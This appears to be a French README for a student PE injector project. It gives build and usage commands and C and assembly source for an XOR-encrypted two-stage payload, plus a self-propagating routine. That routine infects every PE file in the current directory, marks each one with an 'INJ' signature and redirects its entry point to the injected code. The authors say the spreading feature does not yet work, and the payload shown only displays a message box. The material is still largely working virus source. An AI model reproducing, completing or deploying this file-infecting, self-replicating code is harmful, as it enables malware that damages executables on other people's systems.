
## Compilation

```
nmake inj
```
Le PE est construit et se nomme injpe.exe

##Execution 
```
injpe.exe <PE à injecter>
```

## Bonus
1- Nous avons ajouter du chiffrement, le code à injecter avec une fonction encrypt qui fait un xor:
Nous avons donc deux étages, une première étage de payload dans la section reloc qui s'occupe de déchiffer la deuxième étage qu'on a mis dans une nouvelle section
appelé ".packed". la première section saute ensuite sur le code de la deuxième section après le déchiffrement
```
//__declspec(code_seg("decrypt"))
VOID encryption(PVOID addr, DWORD size) {
    DWORD oldProtect;
    VirtualProtect(addr, size, PAGE_READWRITE, &oldProtect);
    DWORD KEY = 0xAA;
    DWORD new_key = 0;
    for(DWORD i=0; i<size; ++i) {
        new_key = ((PUCHAR)addr)[i] ^ KEY;
        ((PUCHAR)addr)[i] = new_key;
        KEY = new_key;
    }

    // Restore original protection
    VirtualProtect(addr, size, oldProtect, &oldProtect);
    return;
}


__declspec(code_seg("decrypt"))
PVOID decryption(DWORD size_decrypt) {
    DWORD oldProtect;
    PVOID dll = get_dll_d(kernel32_str_d);

    PVOID get_module_handle = get_func_d(get_module_handle_str_d, dll);
    HMODULE hModule = ((get_module_handle_def)get_module_handle)(NULL);
    if (hModule == NULL) {
        //printf("Error getting module handle\n");
        return NULL;
    }
    LPVOID lpBaseAddress = (LPVOID)hModule;
    PIMAGE_DOS_HEADER   pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;
    //DWORD first_stage_size = *((&pDosHeader->e_res2[8]) - 0x2);

    PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)((PUCHAR)lpBaseAddress + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)((PUCHAR)pNtHeader + sizeof (IMAGE_NT_HEADERS64));
    WORD idxSection = pNtHeader->FileHeader.NumberOfSections - 1;

    LPVOID packedSectionPtr = (LPVOID)((BYTE*)hModule + pSection[idxSection].VirtualAddress);

    PVOID addr = (PVOID) ((PUCHAR)packedSectionPtr);

    PVOID virtual_protect = get_func_d(virtual_protect_str_d, dll);
    ((virtual_protect_def)virtual_protect)(addr, size_decrypt, PAGE_READWRITE, &oldProtect);
    UCHAR KEY = 0xAA;
    UCHAR new_key = 0;
    for(DWORD i=0; i<size_decrypt; ++i) {
        new_key = ((PUCHAR)addr)[i];
        ((PUCHAR)addr)[i] = ((PUCHAR)addr)[i] ^ KEY;
        KEY = new_key;
    }
    // Restore original protection
    ((virtual_protect_def)virtual_protect)(addr, size_decrypt, oldProtect, &oldProtect);
    return addr;
}

```


```

public first_stage
public __begin_decrypt
public size_code
public decrypt_code
public decrypt_segment_size
public delta_d

decrypt segment read execute
    __begin_decrypt label BYTE

    first_stage proc

        call _nexti

        _nexti:
            pop rbp 
            sub rbp, _nexti - first_stage
            mov rdi, rbp
            ; align
            sub rsp, 16
            and rsp, -1
            ; call decrypt(addr, size)
            mov rbx, [rbp + (decrypt_code - __begin_decrypt)]
            add rbx, rbp
            push 0
            xor rcx, rcx
            mov ecx, size_code
            ;pop rdx
            ;mov rcx, decrypt_segment_size
            ;pop rcx
            call rbx
            push 0
            ;push 0
            ;push 0
            call rax

            pop rax 

            mov rbx, [rdi + (delta_d - __begin_decrypt)]
            add rbx, rdi
            jmp rbx



        _endi:
        size_code label DWORD
            dq 0
        decrypt_code label QWORD
            dq 0
        decrypt_segment_size label QWORD
            dq 0
        delta_d label QWORD
            dq 0
    
    first_stage endp

    
decrypt ends


```

2 - Nous avons aussi essayé d'implémenter une fonctionnalité pour infecter tous les fichiers PE du dossier courant. Cette fonctionnalité
est censé fonctionner comme suit:
    On infecte un premier fichier PE avec injpe.exe. Ce fichier PE contient le code pour infecter tout le dossier courant
    A l'exution du PE infecter, tous les fichiers PE du dossier courant sont infectés. ce qui fait que si un des PE est déplacé dans un autre répertoire,
    Il infectera les PE de ce répertoire? Notons que dans les entetes PE nous avons injecter la chaine "INJ\x00" qui nous permet de savoir si c'est déja un fichier PE infecté ou packedSectionPtr

Malheureusement, contre toute attente cette fonctionnalité n'est pas arrivé au bout. Nous tombons sur une erreur que nous n'arrivons pas à comprendre, mais néanmoins voici le code implémenté:

```
__declspec(code_seg("injected"))
void       inj_code_c() {
    
    PVOID dll = get_dll(kernel32_str);
    PVOID loadlib = get_func(loadlibrary_str, dll);
    HMODULE hM = ((loadlib_call)loadlib)(user32_str);
    PVOID msgbox = get_func(msgbox_str, hM);
    ((msgbox_call)msgbox)(NULL, msgbox_body_str, msgbox_caption_str, 0);
    list_pe_files_and_inject(dll);

    return;
}

__declspec(code_seg("injected"))
void list_pe_files_and_inject(PVOID dll) {
    
    PVOID find_first_file = get_func(find_first_file_str, dll);
    
    PVOID find_next_file = get_func(find_next_file_str, dll);
    PVOID find_close = get_func(find_close_str, dll);

    WIN32_FIND_DATA findFileData;
    HANDLE hFind = ((find_first_file_def)find_first_file)(wildcard_str, &findFileData);

    do {
        if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            if (is_pe_file(findFileData.cFileName, dll)) {
                injector(dll, (char *)findFileData.cFileName);
                    return;
            }
        }
    } while (((find_next_file_def)find_next_file)(hFind, &findFileData) != 0);

    ((find_close_def)find_close)(hFind);
    return ;
}


__declspec(code_seg("injected"))
int injector(PVOID dll, char *thefile)
{
    PVOID get_module_handle = get_func(get_module_handle_str, dll);
    HMODULE hModule = ((get_module_handle_def)get_module_handle)(NULL);
    if (hModule == NULL) {
        return 1;
    }
    LPVOID lpBaseAddress = (LPVOID)hModule;
    PIMAGE_DOS_HEADER   pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;

    PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)((PUCHAR)lpBaseAddress + pDosHeader->e_lfanew);
    DWORD ep = (DWORD) pNtHeader->OptionalHeader.AddressOfEntryPoint;
    LPVOID entryPoint = (LPVOID)((BYTE*)hModule + ep);
    //PUCHAR aep = (PUCHAR) entry_point;
    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)((PUCHAR)pNtHeader + sizeof (IMAGE_NT_HEADERS64));
    // Reloc , avant derniere section
    WORD idxSection = pNtHeader->FileHeader.NumberOfSections - 2;

    //LPVOID relocSectionPtr = (LPVOID)((BYTE*)hModule + pSection[idxSection].VirtualAddress);
    DWORD size = pSection[idxSection].SizeOfRawData - (pNtHeader->OptionalHeader.AddressOfEntryPoint - pSection[idxSection].VirtualAddress);
    DWORD first_stage_size = size;
    LPVOID srcPtr = entryPoint;

    idxSection = pNtHeader->FileHeader.NumberOfSections - 1;
    LPVOID srcPtr_second_stage = (LPVOID)((BYTE*)hModule + pSection[idxSection].VirtualAddress);
    DWORD second_stage_size = pSection[idxSection].Misc.VirtualSize;

    //char *thefile = av[1];
    PVOID create_file_a = get_func(create_file_a_str, dll);
    HANDLE hFile = ((create_file_a_def)create_file_a)(
            thefile,
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
            );
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }
    PVOID get_file_size = get_func(get_file_size_str, dll);
    DWORD dwFileSize = ((get_file_size_def)get_file_size)(hFile, NULL);
    DWORD dwNewFileSize = dwFileSize + new_section_size + second_stage_size;
    PVOID create_file_mapping = get_func(create_file_mapping_str, dll);
    PVOID close_handle = get_func(close_handle_str, dll);

    HANDLE hMapFile = ((create_file_mapping_def)create_file_mapping)(
                hFile,
                NULL,
                PAGE_READWRITE,
                0,
                dwNewFileSize,
                NULL
            );
    if (!hMapFile) {
        ((close_handle_def)close_handle)(hFile);
        return 0;
    }

    PVOID map_view_of_file = get_func(map_view_of_file_str, dll);

    LPVOID lpMapAdr = ((map_view_of_file_def)map_view_of_file)(
                hMapFile,
                FILE_MAP_ALL_ACCESS,
                0,
                0,
                0 // dwFileSize
            );

    if (!lpMapAdr) {
        ((close_handle_def)close_handle)(hMapFile);
        ((close_handle_def)close_handle)(hFile);
        return 0;
    } 
    // LIST PE HEADER
    pDosHeader = (PIMAGE_DOS_HEADER)lpMapAdr;
    my_memcpy_i((void*)&pDosHeader->e_res2[8], "INJ\x00", 4);
    //*((&pDosHeader->e_res2[8]) - 0x2) = first_stage_size;
    pNtHeader = (PIMAGE_NT_HEADERS64)((PUCHAR)lpMapAdr + pDosHeader->e_lfanew);
    pSection = (PIMAGE_SECTION_HEADER)((PUCHAR)pNtHeader + sizeof (IMAGE_NT_HEADERS64));
    idxSection = pNtHeader->FileHeader.NumberOfSections - 1;
    PUCHAR dstPtr = (PUCHAR)lpMapAdr + pSection[idxSection].PointerToRawData + pSection[idxSection].SizeOfRawData;
    
    DWORD old_EP =  pNtHeader->OptionalHeader.AddressOfEntryPoint;
    pNtHeader->OptionalHeader.AddressOfEntryPoint = pSection[idxSection].VirtualAddress + pSection[idxSection].SizeOfRawData;
    

    my_memcpy_i(dstPtr, (PUCHAR)srcPtr, first_stage_size);

    pSection[idxSection].Misc.VirtualSize = first_stage_size;
    pSection[idxSection].SizeOfRawData = (first_stage_size + 0xFFF) & ~0xFFF;
    pSection[idxSection].Characteristics |= IMAGE_SCN_MEM_EXECUTE;  

    add_section_i((BYTE *)lpMapAdr, (PUCHAR)srcPtr_second_stage, second_stage_size);

    PVOID unmap_view_of_file = get_func(unmap_view_of_file_str, dll);

    // Clean up
    ((unmap_view_of_file_def)unmap_view_of_file)(lpMapAdr);
    ((close_handle_def)close_handle)(hMapFile);
    ((close_handle_def)close_handle)(hFile);

    return 1;
}

__declspec(code_seg("injected"))
int is_pe_file(LPCTSTR filename, PVOID dll) {
    PVOID create_file_a = get_func(create_file_a_str, dll);
    HANDLE hFile = ((create_file_a_def)create_file_a)(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PVOID create_file_mapping = get_func(create_file_mapping_str, dll);
    PVOID close_handle = get_func(close_handle_str, dll);
    HANDLE hMapping = ((create_file_mapping_def)create_file_mapping)(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) {
        ((close_handle_def)close_handle)(hFile);
        return 0;
    }

    PVOID map_view_of_file = get_func(map_view_of_file_str, dll);

    LPVOID lpMapAdr = ((map_view_of_file_def)map_view_of_file)(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!lpMapAdr) {
        ((close_handle_def)close_handle)(hMapping);
        ((close_handle_def)close_handle)(hFile);
        return 0;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpMapAdr;

    // Check if the file has the 'MZ' magic number
    PVOID unmap_view_of_file = get_func(unmap_view_of_file_str, dll);
    if (pDosHeader->e_magic != 0x5A4D || (pDosHeader->e_magic == 0x5A4D && *(DWORD*)(&pDosHeader->e_res2[8]) == 0x4A4E49)) {
        ((unmap_view_of_file_def)unmap_view_of_file)(lpMapAdr);
        ((close_handle_def)close_handle)(hMapping);
        ((close_handle_def)close_handle)(hFile);
        return 0;
    }

    // Check if it has a valid PE signature
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)lpMapAdr + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != 0x00004550) { // 'PE\0\0'
        ((unmap_view_of_file_def)unmap_view_of_file)(lpMapAdr);
        ((close_handle_def)close_handle)(hMapping);
        ((close_handle_def)close_handle)(hFile);
        return 0;
    }

    // Clean up
    ((unmap_view_of_file_def)unmap_view_of_file)(lpMapAdr);
    ((close_handle_def)close_handle)(hMapping);
    ((close_handle_def)close_handle)(hFile);

    return 1;
}


```
